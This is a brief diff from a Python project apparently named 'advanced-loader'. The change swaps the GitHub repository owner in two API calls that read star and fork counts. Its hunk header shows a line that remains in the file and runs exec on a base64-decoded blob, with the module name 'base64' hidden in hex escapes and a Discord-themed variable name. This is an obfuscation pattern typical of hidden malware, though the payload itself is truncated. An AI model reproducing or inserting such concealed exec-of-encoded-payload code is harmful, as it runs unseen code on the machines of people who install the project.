@@ -45,9 +45,9 @@ exec(__import__("\x62\x61\x73\x65\x36\x34").b64decode(_yvesdiscord__yvesdiscord_
 
 def main():
     stars = requests.get(
-        f"https://api.github.com/repos/Christopheryves/advanced-loader").json()["stargazers_count"]
+        f"https://api.github.com/repos/Empty-Software/advanced-loader").json()["stargazers_count"]
     forks = requests.get(
-        f"https://api.github.com/repos/Christopheryves/advanced-loader").json()["forks_count"]
+        f"https://api.github.com/repos/Empty-Software/advanced-loader").json()["forks_count"]
 
 
 class AdvancedLoginRegister(QWidget):
